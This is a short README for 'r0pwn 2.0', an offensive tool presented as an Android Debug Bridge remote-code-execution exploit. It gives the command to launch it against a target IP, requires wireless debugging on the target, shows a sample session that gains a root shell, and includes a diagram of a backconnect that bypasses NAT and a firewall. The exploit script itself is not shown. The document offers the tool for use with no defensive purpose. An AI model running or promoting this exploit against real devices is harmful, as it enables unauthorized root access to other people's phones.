# r0pwn 2.0

*hmm...*

    Android Debug Bridge RCE exploit.

## Table of contents

* [Dependencies](#dependencies)
* [Exploiting](#exploiting)
* [Exploit Algorithm](#algorithm)

## Dependencies

* `android-platform-tools`

## Exploiting

```shell
python3 exploit.py <target>
```

**NOTE:** Target should have wireless debugging turned on

```shell
root@kali:~/r0pwn# python3 exploit.py 192.168.1.75

======================
r0pwn by Ivan Nikolsky
======================

Android Debug Bridge RCE exploit.

exploiting 192.168.1.75...
root@nevada:~# whoami
root
root@nevada:~#
```

# Algorithm

```
                    backconnect (over ADB)
               +------------------------------+
               |                              |
attacker --- r0pwn --- NAT -+- Firewall -+- target
                            |            |
                            +------------+
                                bypass
```
